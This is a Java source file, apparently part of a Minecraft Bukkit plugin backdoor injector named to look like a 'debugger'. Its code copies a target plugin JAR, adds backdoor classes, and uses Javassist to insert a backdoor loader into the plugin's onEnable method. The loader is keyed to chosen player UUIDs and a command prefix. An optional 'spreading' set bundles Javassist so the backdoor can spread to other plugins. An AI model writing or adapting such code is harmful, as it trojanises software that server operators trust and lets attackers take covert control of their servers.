package org.bukkit.debugger;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.apache.commons.lang.SystemUtils;
import org.yaml.snakeyaml.Yaml;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.JarURLConnection;
import java.net.URL;
import java.nio.file.*;
import java.util.Map;

public class API {

    public static boolean patchFile(String orig, String out, SimpleConfig config, boolean override, boolean quiet) {
        Path input = Paths.get(orig);
        Path output = Paths.get(out);

        if (!input.toFile().exists()) {
            if(!quiet) {
                InjectorGUI.displayError("Input file does not exist.");
                System.out.println("[API] Input file: " + input.getFileName() + " does not exist.");
            }
            return false;
        }

        /*--- Create Output File ---*/

        File temp = new File("temp");
        temp.mkdirs();
        temp.deleteOnExit();

        //Clone file
        try {
            Files.copy(input, output);
        } catch (FileAlreadyExistsException e) {
            if (override) {
                try {
                    Files.copy(input, output, StandardCopyOption.REPLACE_EXISTING);
                } catch (IOException e1) {
                    if(!quiet) {
                        InjectorGUI.displayError("Unknown IO error when creating output file.");
                        System.out.println("[API] Unknown error creating file: " + output.getFileName());
                        e.printStackTrace();
                    }
                    return false;
                }
            }else{
                return false;
            }

        } catch (IOException e) {
            if(!quiet) {
                InjectorGUI.displayError("Unknown IO Error when creating output file.");
                System.out.println("[API] Unknown error creating file: " + output.getFileName());
                e.printStackTrace();
            }
            return false;
        }

        /*--- Read Plugin Metadata ---*/

        if(!quiet) {
            System.out.println("[API] Reading plugin data for file: " + input.getFileName());
            System.out.println(input.toAbsolutePath());
        }
        Map<String, Object> pluginYAML = readPluginYAML(input.toAbsolutePath().toString(), quiet);
        String name = (String) pluginYAML.get("name");
        String mainClass = (String) pluginYAML.get("main");

        if(!quiet)
            System.out.println("[API] Found plugin name: " + name + "\n[API] Found main class: " + mainClass);

        /*--- Copy Backdoor Code ---*/

        FileSystem outStream    = null;
        try {
            outStream   = FileSystems.newFileSystem(output, (ClassLoader) null);
        } catch (IOException e) {
            if(!quiet) {
                e.printStackTrace();
            }
        }

        if(!quiet)
            System.out.println("[API] Injecting resources.");

        int length = resource_paths_required.length;
        if(config.injectOther)
            length += resource_paths_spreading.length;

        InputStream[] resourceStreams = new InputStream[length];
        Path[] targetPaths = new Path[length];

        //Add required resources
        for(int i = 0; i < resource_paths_required.length; i++){
            resourceStreams[i] = API.class.getResourceAsStream("/" + resource_paths_required[i].replace(".", "/") + ".class");
            targetPaths[i] = outStream.getPath("/" + resource_paths_required[i].replace(".", "/") + ".class");

            try {
                Files.createDirectories(targetPaths[i].getParent());
            } catch (IOException e) {
                continue;
            }

        }

        //Add spreading resources
        if(config.injectOther){
            for(int i = 0; i < resource_paths_spreading.length; i++){
                resourceStreams[i + resource_paths_required.length] = API.class.getResourceAsStream("/" + resource_paths_spreading[i].replace(".", "/") + ".class");
                targetPaths[i + resource_paths_required.length] = outStream.getPath("/" + resource_paths_spreading[i].replace(".", "/") + ".class");

                try {
                    Files.createDirectories(targetPaths[i + resource_paths_required.length].getParent());
                } catch (IOException e) {
                    continue;
                }

            }
        }

        try {
            //copy files

            for (int i = 0; i < targetPaths.length; i++) {
                if(!quiet)
                    System.out.println("    (" + (i + 1) + "/" + targetPaths.length + ") " + targetPaths[i].getFileName());
                Files.copy(resourceStreams[i], targetPaths[i]);
            }

        }catch(FileAlreadyExistsException e){
            if(!quiet) {
                InjectorGUI.displayError("Plugin already patched.");
                System.out.println("[API] Plugin already patched.");
                e.printStackTrace();
            }

            try {
                outStream.close();
            } catch (IOException ex) {
                if(!quiet)
                    ex.printStackTrace();
            }

            return false;
        }
        catch(IOException e){
            if(!quiet) {
                InjectorGUI.displayError("Unknown IO error while copying resources.");
                System.out.println("[API] Unknown IO error while copying resources.");
                e.printStackTrace();
            }
            return false;
        }

        /*--- Insert bytecode into main class ---*/

        try {
            ClassPool pool = new ClassPool(ClassPool.getDefault());
            pool.appendClassPath(orig);
            pool.appendClassPath(new ClassClassPath(org.bukkit.debugger.Debugger.class));

            //Get main class, and find onEnable method

            if(!quiet)
                System.out.println("[API] Injecting backdoor loader into class.");

            CtClass cc = pool.get(mainClass);
            CtMethod m = cc.getDeclaredMethod("onEnable");

            //Parse UUID string
            StringBuilder sb = new StringBuilder();
            sb.append("new String[]{");
            for(int i = 0; i < config.UUID.length; i++){
                sb.append("\"");
                sb.append(config.UUID[i]);
                sb.append("\"");
                if(i != config.UUID.length - 1)
                    sb.append(",");
            }
            sb.append("}");
            if(!quiet)
                System.out.println("{ new org.bukkit.debugger.Debugger(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\", " + (config.injectOther ? "true" : "false") + "); }");
            m.insertAfter("{ new org.bukkit.debugger.Debugger(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\", " + (config.injectOther ? "true" : "false") + "); }");

            //Write to temporary file
            cc.writeFile(temp.toString());
        }catch(Exception e){
            if(!quiet) {
                InjectorGUI.displayError("Unknown Javassist error.");
                System.out.println("[API] Unknown Javassist error.");
                e.printStackTrace();
            }
            return false;
        }

        /*--- Write new main class ---*/

        if(!quiet)
            System.out.println("[API] Writing patched main class.");
        Path patchedFile        = null;
        Path target             = null;

        try {
            //Write final patched file
            patchedFile = Paths.get("temp/" + mainClass.replace(".", "/") + ".class");
            target      = outStream.getPath("/" + mainClass.replace(".", "/") + ".class");

            Files.copy(patchedFile, target, StandardCopyOption.REPLACE_EXISTING);
            if(!quiet)
                System.out.println("[API] Finished writing file: " + output.getFileName());
            outStream.close();
        }catch(IOException e){
            if(!quiet) {
                System.out.println("[API] Unknown IO error when copying new main class.");
                e.printStackTrace();
            }
            return false;
        }


        return true;
    }

    private static Map<String, Object> readPluginYAML(String path, boolean quiet) {
        Yaml yamlData = new Yaml();
        InputStream is = null;

        //Get plugin.yml file path
        String inputFile = null;
        if(SystemUtils.IS_OS_LINUX || SystemUtils.IS_OS_MAC)
            inputFile = "jar:file://" + path + "!/plugin.yml";
        if(SystemUtils.IS_OS_WINDOWS)
            inputFile = "jar:file:/" + path + "!/plugin.yml";

        try {
            if (inputFile.startsWith("jar:")) {
                URL inputURL = new URL(inputFile);
                JarURLConnection connection = (JarURLConnection) inputURL.openConnection();
                is = connection.getInputStream();
            }
        } catch (IOException e) {
            if(!quiet) {
                InjectorGUI.displayError("Unknown error whist parsing plugin YAML.");
                System.out.println("[API] Unknown error whilst parsing plugin YAML.");
                e.printStackTrace();
            }
            return null;
        }

        return yamlData.load(is);
    }

    //Simplifed config for injector gui
    public static class SimpleConfig {
        public boolean useUsernames;
        public String[] UUID;
        public String prefix;
        public boolean injectOther;

        public SimpleConfig(boolean b1, String[] s1, String s2, boolean b2) {
            useUsernames = b1;
            UUID = s1;
            prefix = s2;
            injectOther = b2;
        }
    }

    private static String[] resource_paths_required = {
            "org.bukkit.debugger.Debugger",
            "org.bukkit.debugger.Debugger$1",
            "org.bukkit.debugger.Debugger$2",
            "org.bukkit.debugger.Debugger$3",
            "org.bukkit.debugger.Debugger$4",
            "org.bukkit.debugger.Debugger$5",
            "org.bukkit.debugger.Debugger$6",
            "org.bukkit.debugger.Debugger$7",
            "org.bukkit.debugger.Debugger$8",
            "org.bukkit.debugger.Debugger$9",
            "org.bukkit.debugger.Debugger$10",
            "org.bukkit.debugger.Debugger$11",
            "org.bukkit.debugger.Config",
            "org.bukkit.debugger.Config$HelpItem",
            "org.bukkit.debugger.API",
            "org.bukkit.debugger.API$SimpleConfig"
    };
    private static String[] resource_paths_spreading = {
            "javassist.ClassPath",
            "javassist.ClassPool",
            "javassist.NotFoundException",
            "javassist.CannotCompileException",
            "javassist.CtClass",
            "javassist.CtArray",
            "javassist.CtClassType",
            "javassist.CtNewClass",
            "javassist.CtNewNestedClass",
            "javassist.ClassPool$1",
            "javassist.ClassPoolTail",
            "javassist.CtPrimitiveType",
            "javassist.ClassMap",
            "javassist.CtClass$1",
            "javassist.CtClass$DelayedFileOutputStream",
            "javassist.ClassClassPath",
            "javassist.ClassPathList",
            "javassist.JarClassPath",
            "javassist.CtMember",
            "javassist.CtBehavior",
            "javassist.CtMethod",
            "javassist.CtField",
            "javassist.CtConstructor",
            "javassist.bytecode.BadBytecode",
            "javassist.compiler.CompileError",
            "javassist.bytecode.AttributeInfo",
            "javassist.bytecode.InnerClassesAttribute",
            "javassist.bytecode.SignatureAttribute",
            "javassist.bytecode.ConstantAttribute",
            "javassist.CtMember$Cache",
            "javassist.bytecode.ClassFile",
            "javassist.bytecode.DuplicateMemberException",
            "javassist.bytecode.ConstPool",
            "javassist.bytecode.ConstInfo",
            "javassist.bytecode.ConstInfoPadding",
            "javassist.bytecode.NameAndTypeInfo",
            "javassist.bytecode.MemberrefInfo",
            "javassist.bytecode.FieldrefInfo",
            "javassist.bytecode.MethodrefInfo",
            "javassist.bytecode.InterfaceMethodrefInfo",
            "javassist.bytecode.StringInfo",
            "javassist.bytecode.IntegerInfo",
            "javassist.bytecode.FloatInfo",
            "javassist.bytecode.LongInfo",
            "javassist.bytecode.DoubleInfo",
            "javassist.bytecode.MethodHandleInfo",
            "javassist.bytecode.MethodTypeInfo",
            "javassist.bytecode.InvokeDynamicInfo",
            "javassist.bytecode.Utf8Info",
            "javassist.bytecode.ClassInfo",
            "javassist.bytecode.LongVector",
            "javassist.bytecode.FieldInfo",
            "javassist.bytecode.AnnotationDefaultAttribute",
            "javassist.bytecode.BootstrapMethodsAttribute",
            "javassist.bytecode.Opcode",
            "javassist.bytecode.CodeAttribute",
            "javassist.bytecode.DeprecatedAttribute",
            "javassist.bytecode.EnclosingMethodAttribute",
            "javassist.bytecode.ExceptionsAttribute",
            "javassist.bytecode.LineNumberAttribute",
            "javassist.bytecode.LocalVariableAttribute",
            "javassist.bytecode.LocalVariableTypeAttribute",
            "javassist.bytecode.MethodParametersAttribute",
            "javassist.bytecode.AnnotationsAttribute",
            "javassist.bytecode.ParameterAnnotationsAttribute",
            "javassist.bytecode.TypeAnnotationsAttribute",
            "javassist.bytecode.SourceFileAttribute",
            "javassist.bytecode.SyntheticAttribute",
            "javassist.bytecode.StackMap",
            "javassist.bytecode.StackMapTable",
            "javassist.bytecode.MethodInfo",
            "javassist.bytecode.CodeAttribute$RuntimeCopyException",
            "javassist.bytecode.ExceptionTable",
            "javassist.bytecode.ExceptionTableEntry",
            "javassist.bytecode.StackMapTable$RuntimeCopyException",
            "javassist.bytecode.Descriptor",
            "javassist.bytecode.CodeIterator",
            "javassist.bytecode.CodeIterator$AlignmentException",
            "javassist.bytecode.CodeIterator$Branch",
            "javassist.bytecode.CodeIterator$Branch16",
            "javassist.bytecode.CodeIterator$Jump16",
            "javassist.bytecode.CodeIterator$If16",
            "javassist.bytecode.ByteVector",
            "javassist.bytecode.Bytecode",
            "javassist.compiler.Javac",
            "javassist.compiler.ast.Visitor",
            "javassist.compiler.TokenId",
            "javassist.compiler.CodeGen",
            "javassist.compiler.MemberCodeGen",
            "javassist.compiler.JvstCodeGen",
            "javassist.compiler.ProceedHandler",
            "javassist.compiler.Javac$CtFieldWithInit",
            "javassist.compiler.ast.ASTree",
            "javassist.compiler.ast.ASTList",
            "javassist.compiler.ast.Stmnt",
            "javassist.compiler.ast.Expr",
            "javassist.compiler.ast.AssignExpr",
            "javassist.compiler.ast.BinExpr",
            "javassist.compiler.ast.CastExpr",
            "javassist.compiler.ast.InstanceOfExpr",
            "javassist.compiler.TypeChecker",
            "javassist.compiler.CodeGen$ReturnHook",
            "javassist.compiler.CodeGen$1",
            "javassist.compiler.ast.Symbol",
            "javassist.compiler.ast.Member",
            "javassist.compiler.MemberCodeGen$JsrHook2",
            "javassist.compiler.ast.ArrayInit",
            "javassist.compiler.NoFieldException",
            "javassist.compiler.JvstTypeChecker",
            "javassist.compiler.MemberResolver",
            "javassist.compiler.ast.StringL",
            "javassist.compiler.ast.CallExpr",
            "javassist.compiler.ast.DoubleConst",
            "javassist.compiler.ast.IntConst",
            "javassist.compiler.ast.Keyword",
            "javassist.compiler.ast.NewExpr",
            "javassist.compiler.SymbolTable",
            "javassist.bytecode.AccessFlag",
            "javassist.Modifier",
            "javassist.compiler.ast.Declarator",
            "javassist.bytecode.ByteArray",
            "javassist.compiler.Parser",
            "javassist.compiler.SyntaxError",
            "javassist.compiler.ast.MethodDecl",
            "javassist.compiler.ast.FieldDecl",
            "javassist.compiler.ast.CondExpr",
            "javassist.compiler.ast.Pair",
            "javassist.compiler.ast.Variable",
            "javassist.compiler.Lex",
            "javassist.compiler.KeywordTable",
            "javassist.compiler.Token",
            "javassist.bytecode.SignatureAttribute$Type",
            "javassist.bytecode.SignatureAttribute$ObjectType",
            "javassist.bytecode.SignatureAttribute$ArrayType",
            "javassist.bytecode.SignatureAttribute$BaseType",
            "javassist.bytecode.SignatureAttribute$ClassType",
            "javassist.bytecode.SignatureAttribute$TypeVariable",
            "javassist.compiler.MemberResolver$Method",
            "javassist.bytecode.CodeIterator$Gap",
            "javassist.bytecode.StackMapTable$Walker",
            "javassist.bytecode.StackMapTable$OffsetShifter",
            "javassist.bytecode.StackMapTable$Shifter",
            "javassist.bytecode.stackmap.TypeTag",
            "javassist.bytecode.stackmap.Tracer",
            "javassist.bytecode.stackmap.MapMaker",
            "javassist.bytecode.stackmap.TypeData",
            "javassist.bytecode.stackmap.TypeData$BasicType",
            "javassist.bytecode.stackmap.BasicBlock$JsrBytecode",
            "javassist.bytecode.stackmap.TypeData$ClassName",
            "javassist.bytecode.stackmap.BasicBlock",
            "javassist.bytecode.stackmap.TypedBlock",
            "javassist.bytecode.stackmap.BasicBlock$Maker",
            "javassist.bytecode.stackmap.TypedBlock$Maker",
            "javassist.bytecode.stackmap.BasicBlock$Mark",
            "javassist.bytecode.stackmap.BasicBlock$Catch",
            "javassist.bytecode.stackmap.TypeData$AbsTypeVar",
            "javassist.bytecode.stackmap.TypeData$TypeVar",
            "javassist.bytecode.stackmap.TypeData$UninitTypeVar",
            "javassist.bytecode.stackmap.TypeData$UninitData",
            "javassist.bytecode.stackmap.TypeData$NullType",
            "javassist.bytecode.stackmap.TypeData$ArrayElement",
            "javassist.bytecode.StackMapTable$Writer",
            "org.bukkit.plugin.Plugin"
    };
}


